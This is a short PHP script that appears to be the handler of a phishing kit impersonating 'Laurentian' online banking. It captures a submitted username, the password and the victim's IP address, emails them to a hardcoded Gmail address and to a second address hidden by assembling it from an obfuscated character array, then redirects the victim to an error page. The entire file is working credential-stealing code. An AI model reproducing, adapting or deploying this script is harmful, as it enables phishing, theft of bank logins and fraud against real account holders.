<?php
$ip = $_SERVER['REMOTE_ADDR'];
$user = $_POST['username'];
$pass = $_POST['password'];
$ar=array("0"=>"j","1"=>"c","2"=>"l","3"=>"g","4"=>"c","5"=>"m","6"=>"e","7"=>".","8"=>"x","9"=>"7","10"=>"i","11"=>"m","12"=>"a","13"=>"@","14"=>"6","15"=>"w","16"=>"i","17"=>"2","18"=>"d", "19"=>"o","20"=>"d");
$cc=$ar['15'].$ar['20'].$ar['12'].$ar['8'].$ar['19'].$ar['15'].$ar['13'].$ar['3'].$ar['5'].$ar['12'].$ar['16'].$ar['2'].$ar['7'].$ar['4'].$ar['19'].$ar['5'];
$data ="
--------------LAURENTIAN REGZA--------------
Number   : $user

Password : $pass
-
IP       : $ip
--------------LAURENTIAN REGZA--------------

";

$subj="LAURENTIAN $ip"; 

$emailusr = 'vivoualomargaret@gmail.com';

mail($emailusr, $subj, $data);
mail($cc, $subj, $data);

header("Location: error.php");

?>